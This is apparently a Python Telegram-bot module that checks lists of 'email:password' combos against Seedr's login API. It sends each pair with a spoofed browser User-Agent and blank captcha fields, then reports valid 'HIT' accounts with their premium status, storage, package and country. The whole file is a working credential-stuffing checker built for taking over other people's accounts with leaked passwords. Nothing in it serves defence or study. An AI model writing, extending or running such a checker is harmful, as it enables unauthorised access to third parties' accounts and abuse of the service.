import requests
import time

def process_seedr_command(bot, message):
    chat_id = message.chat.id
    account_data = message.text.split()[1:]  # Get the account data from the command
    if account_data:
        total_accounts = len(account_data)
        start_time = time.time()
        results = []
        initial_message = "*↯ SEEDR ACCOUNT*\n\n"
        msg = bot.send_message(chat_id, initial_message + get_footer_info(total_accounts, start_time, message.from_user.username), parse_mode="Markdown")

        for account in account_data:
            result = check_seedr_account(account)
            results.append(f"*Combo:* `{account}`\n*Result =>* {result}")
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=msg.message_id,
                text=initial_message + "\n\n".join(results) + "\n\n" + get_footer_info(total_accounts, start_time, message.from_user.username),
                parse_mode="Markdown"
            )

    else:
        bot.send_message(chat_id, "Please provide account details in the format: /seedr email:password")

def check_seedr_account(account):
    try:
        email, password = account.split(':')
        login_url = "https://www.seedr.cc/auth/login"
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*"
        }
        data = {
            "username": email,
            "password": password,
            "g-recaptcha-response": "",
            "h-captcha-response": "",
            "rememberme": "off"
        }

        response = requests.post(login_url, headers=headers, json=data)
        response_data = response.json()

        if response_data.get("status_code") == 400:
            return "Incorrect Email OR Password❌"
        else:
            account_info = response_data.get("account", {})
            storageGB = convert_bytes_to_gb(account_info.get("space_max", 0))
            package_name = account_info.get("package_name", "Unknown")
            country = response_data.get("country", "N/A")
            country_flag = get_country_flag(country)

            return (f"HIT SUCCESSFULLY✅\n"
                    f"*Premium:* {account_info.get('premium', False)}\n"
                    f"*Storage:* {storageGB} GB\n"
                    f"*Package:* {package_name}\n"
                    f"*Country:* {country} {country_flag}")
    except Exception as e:
        print(f"An error occurred in check_seedr_account: {str(e)}")  # Log error for debugging
        return f"An error occurred while checking the account: {str(e)}"

def convert_bytes_to_gb(bytes):
    gb = bytes / (1024 * 1024 * 1024)
    return f"{gb:.2f}"  # Limiting to 2 decimal places

def get_country_flag(country_name):
    country_codes = {
        "Afghanistan": "AF", "Albania": "AL", "Algeria": "DZ", "Andorra": "AD", "Angola": "AO",
        "United States": "US", "United Kingdom": "GB", "Germany": "DE", "France": "FR", "Spain": "ES",
        "N/A": ""
    }
    country_code = country_codes.get(country_name, "")
    if country_code:
        return ''.join([chr(127397 + ord(c)) for c in country_code])
    return ""

def get_footer_info(total_accounts, start_time, username):
    elapsed_time = time.time() - start_time
    footer = (
        f"*－－－－－－－－－－－－－－－－*\n"
        f"*⌧ Total ACCOUNT Checked - {total_accounts}*\n"
        f"*⌧ Time Taken - {elapsed_time:.2f} seconds*\n"
        f"*⌧ Checked by: {username}*\n"
        f"*⚡️ Bot by - AFTAB [BOSS]*\n"
        f"*－－－－－－－－－－－－－－－－*"
    )
    return footer
